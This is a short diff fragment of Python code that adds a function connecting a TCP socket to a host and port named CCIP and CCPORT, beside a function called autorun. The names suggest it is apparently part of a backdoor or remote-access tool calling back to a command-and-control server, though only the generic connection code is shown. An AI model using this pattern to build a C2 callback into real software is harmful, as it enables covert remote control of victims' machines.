@@ -20,4 +20,13 @@ def autorun():
 #connection Funciton for ip and port
 
 def conn(CCIP, CCPORT):
-    client = 
+    try:
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.connect((CCIP, CCPORT))
+        return client
+    
+    except Exception as error:
+        print(error)
+
+
+#checks for error if fails
